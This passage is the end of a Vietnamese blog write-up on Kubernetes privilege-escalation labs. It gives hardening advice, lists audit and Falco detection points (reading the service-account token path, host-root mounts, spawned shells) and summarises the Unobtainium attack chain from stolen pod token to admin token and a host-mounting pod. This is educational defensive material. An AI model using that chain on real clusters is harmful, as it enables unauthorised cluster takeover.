- RBAC least privilege theo namespace, không cấp `get/list secrets` trừ khi thật sự cần.
- Tuyệt đối hạn chế quyền đọc secrets trong `kube-system`.
- Dùng short-lived bound tokens thay vì long-lived ServiceAccount token secret nếu có thể.
- Bật Pod Security Admission/Kyverno/Gatekeeper để chặn:
  - `hostPath` mount `/`
  - `hostNetwork: true`
  - `privileged: true`
  - pod chạy root không cần thiết
- Audit API Server cho các hành vi:
  - `get/list secrets` trong `kube-system`
  - `describe/get secret *-token-*`
  - tạo pod mới có `hostPath`
  - `kubectl exec` bất thường
- Falco/Tetragon rule nên chú ý:
  - Process trong container đọc `/run/secrets/kubernetes.io/serviceaccount/token`.
  - Container mount host root filesystem.
  - Shell được spawn trong container ứng dụng.

### 16. Takeaway

Unobtainium là ví dụ hay hơn SteamCloud cho phần **leo thang đặc quyền theo chuỗi RBAC**. Attacker không có quyền admin ngay từ đầu, nhưng bằng cách đọc token trong pod, kiểm tra quyền theo từng namespace, pivot sang pod khác và lạm dụng quyền đọc secrets trong `kube-system`, cuối cùng vẫn lấy được token admin và tạo pod mount filesystem host.



## Kết thúc 

Thì đây là các bài lab mà tui học được trong quá trình tìm hiểu về kĩ thuật khai thác leo thang đặc quyền trên K8s , thì chủ yếu đều khai thác do misconfig và lỗi RBAC cấp quyền quá rộng. Qua đó có thể thấy rằng nếu trong môi trường thực tế , các lỗ hổng đôi khi không đến từ các zero-day mà đến từ bản thân con người. Hôm nay tới đây thui, hẹn các bạn ở bài sắp tới !!!!.




